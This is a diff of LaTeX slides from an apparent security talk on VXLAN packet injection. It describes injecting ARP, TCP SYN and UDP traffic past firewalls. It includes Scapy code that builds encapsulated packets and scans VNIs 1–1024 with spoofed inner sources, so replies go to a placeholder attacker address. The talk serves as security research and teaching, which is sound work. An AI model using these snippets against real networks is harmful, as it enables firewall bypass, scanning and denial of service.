@@ -139,8 +139,8 @@ So you are saying it is possible to produce VXLAN packets which sent across the 
 {\bf\LARGE Exactly!}
 
 \vskip 2cm
-And network people has been saying this for many years now, not news,\\
-but even more relevant to repeat it now
+And network people has known VXLAN to be insecure for many years now,\\
+not news perhaps, but even more relevant to repeat it now
 \slide{VXLAN injection}
 
 \hlkimage{19cm}{vxlan-basic-injection.png}
@@ -173,6 +173,7 @@ What is possible:
 \item Inject ARP traffic, send arbitrary ARP packets to hosts, connectivity DoS
 \item Inject TCP like SYN traffic behind the firewall, ex web servers behind load balancer
 \item Inject UDP packets sourced from inside, even being sent out through firewall
+\item Really anything IPv4 and IPv6 can be injected
 \end{list2}
 
 
@@ -204,9 +205,9 @@ Tested working with Clavister with DNS UDP probes/requests, no inspection }
 First create VXLAN header and inside packet
 \begin{minted}[fontsize=\small]{python}
 vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
-vni=37             # Usually VNI == destination VLAN {\bf
+vni=37             # Usually VNI == destination VLAN
 vxlan=Ether(dst=routermac)/IP(src=vtepsrc,dst=vtepdst)/
-   UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")}
+   UDP(sport=vxlanport,dport=vxlanport)/VXLAN(vni=vni,flags="Instance")
 
 broadcastmac="ff:ff:ff:ff:ff:ff"
 randommac="00:51:52:01:02:03"
@@ -294,6 +295,17 @@ Maybe abuse complex protocols such as FTP, SIP etc. to open arbitrary ports?
 
 \slide{Hey, you need a lot of information to do this!}
 
+\begin{minted}[fontsize=\small]{python}
+vxlanport=4789     # RFC 7384 port 4789, Linux kernel default 8472
+vni=37             # Usually VNI == destination VLAN - 4096 values
+broadcastmac="ff:ff:ff:ff:ff:ff" # some attacks can use this
+randommac="00:51:52:01:02:03"    # Source MAC often does not matter
+attacker="185.27.115.666"        # Pls return something to me
+destination="10.0.0.10"          # RFC1918 space, limited
+
+IP(src=vtepsrc,dst=vtepdst)      # src and destination, if filtered at all
+\end{minted}
+
 What I need to do these attacks are:
 \begin{list2}
 \item Injection end points, IPs of the two routers
@@ -301,6 +313,7 @@ What I need to do these attacks are:
 \item IP addresses, internal subnets
 \item MAC addresses - depending on attack
 \end{list2}
+
 
 \slide{Where can I "find" this information}
 
@@ -324,6 +337,24 @@ port likely be 4789/8472
 Any former employee or consultant would know some of this
 
 Do Jazz hands if you think this is possible in real networks
+
+
+\slide{Scanning for VXLAN}
+
+Feel confident we can produce packets for getting responses/scanning:
+\begin{minted}[fontsize=\small]{python}
+sr1(IP(src="127.0.0.1",dst="192.0.2.10")/UDP(sport=vxlanport,dport=vxlanport)
+/VXLAN(vni=(1,1024),flags="Instance")/Ether(dst=broadcastmac,src=randommac)
+/IP(src=attacker,dst="10.0.0.10")/UDP(sport=testport,dport=insideport)
+/DNS(rd=1,id=0xdead,qd=DNSQR(qname="localhost")),timeout=1)
+\end{minted}
+
+\begin{list2}
+\item Above can easily send 1024 probes in a few seconds
+\item Ideas, use something which is NOT used internally
+\item On the inside no firewalls, so like UDP scans on LAN, ICMP unreachable
+\item Or some well-known broadcast service, but need to return to routed IP!
+\end{list2}
 
 
 \slide{Next steps - both some offensive and defensive}
